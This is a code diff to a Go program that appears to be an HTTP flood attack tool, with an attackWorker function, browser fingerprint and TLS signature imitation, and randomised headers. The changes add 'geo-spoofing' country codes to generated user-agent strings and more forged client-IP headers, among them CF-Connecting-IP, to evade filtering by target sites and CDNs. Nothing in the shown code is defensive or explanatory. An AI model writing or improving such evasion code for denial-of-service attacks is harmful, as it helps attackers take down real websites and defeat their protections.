@@ -52,6 +52,26 @@ import (
 )
 
 var (
+	// Country codes for geo-spoofing
+	countryCodes = []string{
+		"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
+		"AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
+		"BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
+		"CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
+		"DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
+		"GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
+		"GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
+		"IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
+		"LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
+		"MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
+		"MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
+		"PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
+		"RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
+		"SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
+		"TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
+		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
+	}
+
 	acceptLanguages = []string{
 	"en-US,en;q=0.9",
 	"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
@@ -202,12 +222,12 @@ var (
 	"zu-ZA,zu;q=0.8",
 	}
 
-acceptHeaders = []string{
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "application/json, text/plain, */*",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "*/*",
-}
+	acceptHeaders = []string{
+		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+		"application/json, text/plain, */*",
+		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"*/*",
+	}
 
 	acceptEncodings = []string{
 		"gzip, deflate, br",
@@ -224,9 +244,9 @@ acceptHeaders = []string{
 		"no-cache",
 		"no-store",
 		"no-transform",
-        "only-if-cached",
-        "public",
-        "private",
+		"only-if-cached",
+		"public",
+		"private",
 		"proxy-revalidate",
 		"s-maxage=86400",
 		"must-revalidate",
@@ -308,7 +328,7 @@ var ja3Signatures = []JA3Signature{
 		MinVersion:       tls.VersionTLS12,
 		MaxVersion:       tls.VersionTLS13,
 	},
-    {
+	{
 		Name: "Edge 146-150",
 		CipherSuites: []uint16{
 			tls.TLS_AES_128_GCM_SHA256,
@@ -507,8 +527,13 @@ func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
 
+func randomCountryCode() string {
+	return countryCodes[randInt(0, len(countryCodes)-1)]
+}
+
 func generateRandomUA() string {
 	browserType := randInt(1, 100)
+	countryCode := randomCountryCode()
 	
 	// Windows versions (2025-2026)
 	windowsVersions := []string{
@@ -575,7 +600,7 @@ func generateRandomUA() string {
 		} else {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, chromeVersion)
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
 	} else if browserType <= 75 { // Firefox 30%
 		osType := randInt(1, 100)
 		var os string
@@ -586,25 +611,25 @@ func generateRandomUA() string {
 		} else {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
-		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, firefoxVersion, firefoxVersion)
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
 	} else if browserType <= 88 { // Edge 13%
 		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, edgeVersion, edgeVersion)
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
 	} else if browserType <= 95 { // Safari 7%
 		os := macVersions[randInt(0, len(macVersions)-1)]
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, safariVersion)
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
 	} else { // Mobile browsers 5%
 		mobileType := randInt(1, 100)
 		if mobileType <= 60 { // Android Chrome
 			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
-			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, device, chromeVersion)
+			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
 		} else if mobileType <= 85 { // iPhone Safari
 			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
 			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
-			return fmt.Sprintf("Mozilla/5.0 (%s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, iosVersion, safariVersion)
+			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
 		} else { // Samsung Internet
 			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
-			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, samsungVersion, chromeVersion)
+			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
 		}
 	}
 }
@@ -897,6 +922,9 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			randomSpoofIP := randomIP()
 			req.Header.Set("X-Forwarded-For", randomSpoofIP)
 			req.Header.Set("X-Real-IP", randomSpoofIP)
+			req.Header.Set("CF-Connecting-IP", randomSpoofIP)
+			req.Header.Set("X-Forwarded", randomSpoofIP)
+			req.Header.Set("Forwarded-For", randomSpoofIP)
 
 			numSecurity := randInt(1, 2)
 			for i := 0; i < numSecurity; i++ {
